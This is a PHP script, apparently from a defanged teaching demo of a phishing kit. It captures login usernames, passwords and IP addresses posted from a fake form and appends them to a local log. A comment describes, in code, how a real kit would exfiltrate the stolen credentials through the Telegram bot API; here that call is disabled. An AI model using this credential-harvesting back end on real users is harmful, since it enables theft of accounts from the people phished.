<?php
/*
 * mainnet.php — FUNCIONAL, con la doble fuga sustituida por un log LOCAL
 * único. Ver annotations.md, sección 4, y HOW_TO_RUN_LOCALLY.md. Nunca
 * hace ninguna petición de red — $config['telegram_bot_token'] es
 * siempre null en este kit (ver zsec_config.php), así que ni por error
 * podría llamar a la API de Telegram.
 */

$config = require __DIR__ . '/zsec_config.php';

$user = $_POST['username'] ?? null;
$pass = $_POST['password'] ?? null;

if (!$user || !$pass) {
    header('Location: index.html');
    exit;
}

$stolen = "Usuario: $user\nClave: $pass\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? '?') . "\nFecha: " . date('c') . "\n";

// 1. Copia local — esto SÍ ocurre de verdad, en tu propio disco:
file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', "=== copia local ===\n$stolen\n", FILE_APPEND);

// 2. EN UN KIT REAL: notificación por Telegram, algo así:
//
//      $url = "https://api.telegram.org/bot{$config['telegram_bot_token']}/sendMessage";
//      curl_init($url); // ... POST con chat_id + texto de $stolen
//
//    AQUÍ: $config['telegram_bot_token'] es `null` (ver zsec_config.php),
//    así que esta llamada NUNCA podría ejecutarse aunque quisieras — es
//    una imposibilidad estructural, no solo una promesa en un comentario.
if ($config['telegram_bot_token']) {
    // Esta rama nunca se alcanza en este kit — el token siempre es null.
    error_log("[DEMO mainnet.php] Aquí se notificaría por Telegram (inalcanzable en este demo)");
}

header('Location: thanks.html');
exit;
